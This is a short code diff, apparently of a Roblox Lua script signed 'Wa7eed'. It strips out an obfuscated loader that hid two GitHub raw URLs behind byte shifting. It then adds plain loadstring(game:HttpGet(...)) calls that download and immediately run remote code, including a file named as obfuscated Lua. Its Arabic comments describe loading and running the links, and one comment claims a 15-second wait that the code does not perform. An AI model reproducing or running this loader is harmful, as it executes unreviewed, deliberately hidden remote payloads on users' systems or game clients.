@@ -7,42 +7,11 @@
     \_/\_/           ||| 
 
           Ｗａ７ｅｅｄ
---]]
-do
-    local _0x = {}
-    local _a = string.char
-    local _b = table.concat
-    local _c = string.byte
-    local _d = task.wait
+-- تحميل وتشغيل الرابط الأول مباشرة
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fsclor911-sketch/DMR/refs/heads/main/AN"))()
 
-    local function _e(str)
-        local t = {}
-        for i = 1, #str do
-            t[i] = _c(str, i) + 7
-        end
-        return t
-    end
+-- الانتظار لمدة 15 ثانية
+wait(2)
 
-    local function _f(tbl)
-        local r = {}
-        for i = 1, #tbl do
-            r[i] = _a(tbl[i] - 7)
-        end
-        return _b(r)
-    end
-
-    local _g = {
-        _e("https://raw.githubusercontent.com/fsclor911-sketch/DMR/refs/heads/main/AN"),
-        _e("https://raw.githubusercontent.com/fsclor911-sketch/DMR/refs/heads/main/obfuscated%20(1).lua%20(8).txt")
-    }
-
-    local function _h(u)
-        return loadstring(game:HttpGet(_f(u)))()
-    end
-
-    (function()
-        _h(_g[1])
-        _d(2)
-        _h(_g[2])
-    end)()
-end
+-- تحميل وتشغيل الرابط الثاني
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fsclor911-sketch/DMR/refs/heads/main/obfuscated%20(1).lua%20(8).txt"))()
